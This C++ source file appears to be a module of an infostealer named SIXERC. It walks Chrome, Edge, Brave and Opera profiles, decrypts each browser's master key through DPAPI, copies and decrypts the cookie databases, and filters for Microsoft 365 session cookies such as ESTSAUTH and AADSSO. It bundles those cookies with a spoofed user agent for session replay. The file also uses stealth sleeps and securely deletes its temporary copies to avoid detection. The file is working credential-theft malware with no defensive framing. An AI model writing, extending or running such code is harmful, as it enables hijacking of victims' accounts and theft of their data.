// ============================================================================
// SIXERC — BPS Implementation
// ============================================================================

#include "modules/bps.hpp"
#include "core/crypto.hpp"
#include "core/utils.hpp"
#include "core/obfuscation.hpp"
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <shlwapi.h>

namespace sixerc::bps {

using json = nlohmann::json;

std::vector<BrowserProfile> enumerate_profiles() {
    std::vector<BrowserProfile> profiles;
    std::wstring local_appdata = utils::get_local_appdata_path();
    if (local_appdata.empty()) return profiles;
    
    struct BrowserDef {
        BrowserType type;
        std::wstring rel_path;
        std::string name;
    };
    
    std::vector<BrowserDef> browsers = {
        {BrowserType::Chrome,  L"Google\\Chrome\\User Data",        "Chrome"},
        {BrowserType::Edge,    L"Microsoft\\Edge\\User Data",        "Edge"},
        {BrowserType::Brave,   L"BraveSoftware\\Brave-Browser\\User Data", "Brave"},
        {BrowserType::Opera,   L"Opera Software\\Opera Stable",       "Opera"},
    };
    
    for (const auto& browser : browsers) {
        std::wstring base_path = local_appdata + L"\\" + browser.rel_path;
        if (!utils::directory_exists(base_path)) continue;
        
        std::wstring local_state = base_path + L"\\Local State";
        if (!utils::file_exists(local_state)) continue;
        
        // Check Default profile
        std::wstring default_cookies = base_path + L"\\Default\\Cookies";
        if (utils::file_exists(default_cookies)) {
            profiles.push_back({
                browser.type,
                base_path + L"\\Default",
                local_state,
                default_cookies,
                browser.name + "::Default"
            });
        }
        
        // Check additional profiles
        auto dirs = utils::list_directories(base_path);
        for (const auto& dir : dirs) {
            if (dir.find(L"Profile ") == 0) {
                std::wstring profile_cookies = base_path + L"\\" + dir + L"\\Cookies";
                if (utils::file_exists(profile_cookies)) {
                    profiles.push_back({
                        browser.type,
                        base_path + L"\\" + dir,
                        local_state,
                        profile_cookies,
                        utils::wstring_to_utf8(browser.name + L"::" + dir)
                    });
                }
            }
        }
    }
    
    return profiles;
}

bytes extract_master_key(const BrowserProfile& profile) {
    try {
        std::ifstream file(utils::wstring_to_utf8(profile.local_state_path));
        if (!file.is_open()) return {};
        
        json j;
        file >> j;
        
        if (!j.contains("os_crypt") || !j["os_crypt"].contains("encrypted_key")) {
            return {};
        }
        
        std::string b64_key = j["os_crypt"]["encrypted_key"];
        bytes encrypted_key = crypto::base64_decode(b64_key);
        
        if (encrypted_key.size() < 5) return {};
        
        // Remove DPAPI prefix (first 5 bytes: "DPAPI")
        if (encrypted_key[0] == 'D' && encrypted_key[1] == 'P' && encrypted_key[2] == 'A' &&
            encrypted_key[3] == 'P' && encrypted_key[4] == 'I') {
            encrypted_key.erase(encrypted_key.begin(), encrypted_key.begin() + 5);
        }
        
        return crypto::dpapi_decrypt(encrypted_key);
    } catch (...) {
        return {};
    }
}

std::vector<SessionCookie> extract_cookies(const BrowserProfile& profile, const bytes& master_key) {
    std::vector<SessionCookie> result;
    
    if (master_key.empty()) return result;
    
    // Copy database to temp location to avoid lock issues
    std::wstring temp_db = utils::get_temp_path() + L"\\sixerc_" + 
        utils::utf8_to_wstring(crypto::base64_encode(crypto::generate_random_bytes(8))) + L".db";
    
    if (!CopyFileW(profile.cookies_db_path.c_str(), temp_db.c_str(), FALSE)) {
        return result;
    }
    
    sqlite3* db = nullptr;
    if (sqlite3_open16(temp_db.c_str(), &db) != SQLITE_OK) {
        utils::delete_file_secure(temp_db);
        return result;
    }
    
    const char* query = "SELECT name, encrypted_value, host_key, path, expires_utc, "
                        "is_secure, is_httponly, is_persistent FROM cookies;";
    
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        utils::delete_file_secure(temp_db);
        return result;
    }
    
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        SessionCookie cookie;
        cookie.browser_source = utils::wstring_to_utf8(profile.profile_path);
        cookie.profile_source = profile.profile_name;
        
        const char* name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
        if (name) cookie.name = name;
        
        const void* enc_val = sqlite3_column_blob(stmt, 1);
        int enc_len = sqlite3_column_bytes(stmt, 1);
        
        const char* host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
        if (host) cookie.domain = host;
        
        const char* path = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 3));
        if (path) cookie.path = path;
        
        cookie.expires_utc = static_cast<uint64_t>(sqlite3_column_int64(stmt, 4));
        cookie.is_secure = sqlite3_column_int(stmt, 5) != 0;
        cookie.is_httponly = sqlite3_column_int(stmt, 6) != 0;
        cookie.is_persistent = sqlite3_column_int(stmt, 7) != 0;
        
        // Decrypt cookie value
        if (enc_val && enc_len > 0) {
            bytes encrypted(static_cast<const byte*>(enc_val), 
                           static_cast<const byte*>(enc_val) + enc_len);
            bytes decrypted = crypto::decrypt_chrome_cookie(encrypted, master_key);
            if (!decrypted.empty()) {
                cookie.value = std::string(decrypted.begin(), decrypted.end());
            }
        }
        
        if (!cookie.value.empty()) {
            result.push_back(cookie);
        }
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    utils::delete_file_secure(temp_db);
    
    return result;
}

std::vector<SessionCookie> filter_m365_cookies(const std::vector<SessionCookie>& cookies) {
    std::vector<SessionCookie> result;
    
    std::vector<std::string> m365_domains = {
        "login.microsoftonline.com",
        "login.live.com",
        "outlook.office365.com",
        "outlook.office.com",
        "teams.microsoft.com",
        "sharepoint.com",
        "onedrive.live.com",
        "portal.office.com"
    };
    
    std::vector<std::string> m365_names = {
        "ESTSAUTH",
        "ESTSAUTHPERSISTENT",
        "ESTSAUTHLIGHT",
        "SignInStateCookie",
        "PPAuth",
        "MSPAuth",
        "MSPCID",
        "x-ms-gateway-slice",
        "stsservicecookie",
        "AADSSO",
        "SSOCOOKIEPULLED"
    };
    
    for (const auto& cookie : cookies) {
        bool domain_match = false;
        for (const auto& domain : m365_domains) {
            if (cookie.domain.find(domain) != std::string::npos) {
                domain_match = true;
                break;
            }
        }
        
        bool name_match = false;
        for (const auto& name : m365_names) {
            if (cookie.name.find(name) != std::string::npos) {
                name_match = true;
                break;
            }
        }
        
        // Also include any cookie from M365 domains regardless of name
        if (domain_match || name_match) {
            result.push_back(cookie);
        }
    }
    
    return result;
}

std::vector<HarvestedSession> harvest_all_sessions() {
    std::vector<HarvestedSession> sessions;
    
    auto profiles = enumerate_profiles();
    for (const auto& profile : profiles) {
        obf::stealth_sleep(100);
        
        auto master_key = extract_master_key(profile);
        if (master_key.empty()) continue;
        
        auto cookies = extract_cookies(profile, master_key);
        auto m365_cookies = filter_m365_cookies(cookies);
        
        if (!m365_cookies.empty()) {
            HarvestedSession session;
            session.cookies = m365_cookies;
            session.browser_fingerprint = profile.profile_name;
            session.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                                "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0";
            session.harvested_at = std::chrono::system_clock::now();
            sessions.push_back(session);
        }
        
        crypto::secure_zero(master_key.data(), master_key.size());
    }
    
    return sessions;
}

} // namespace sixerc::bps
